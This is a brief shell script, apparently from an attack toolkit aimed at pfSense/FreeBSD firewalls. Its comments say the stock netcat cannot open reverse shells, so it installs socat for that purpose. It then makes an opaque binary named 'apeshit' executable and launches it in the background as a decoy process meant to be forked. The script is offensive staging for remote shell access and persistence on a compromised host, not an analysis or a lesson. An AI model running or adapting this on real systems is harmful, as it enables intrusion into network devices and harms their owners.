#!/bin/sh

# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install socat -y

# executable
chmod +x apeshit

# run the daemon/process that does nothing that we intend to fork
./apeshit &
